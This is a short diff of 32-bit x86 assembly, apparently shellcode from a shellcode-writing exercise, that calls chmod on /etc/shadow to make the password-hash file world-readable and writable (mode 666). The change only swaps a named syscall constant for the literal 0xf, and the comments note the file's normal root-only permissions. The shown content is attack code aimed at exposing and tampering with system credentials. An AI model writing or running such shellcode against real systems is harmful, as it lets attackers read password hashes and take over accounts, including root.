@@ -3,8 +3,6 @@
 ; we change the permissions to 666 / -rw-rw-rw
 ; 32 bit
 
-SYS_CHMOD equ		0xf
-
 global _start
 section .text
 
@@ -12,7 +10,7 @@ _start:
 	; chmod(const char *pathname, mode_t mode); -> syscall number 15
 	; normally: -rw-r----- 1 root shadow 1763 jan 28 23:38 /etc/shadow
 
-	mov al, SYS_CHMOD
+	mov al, 0xf 		; chmod
 
 	xor edx, edx
 	push edx		; string terminator
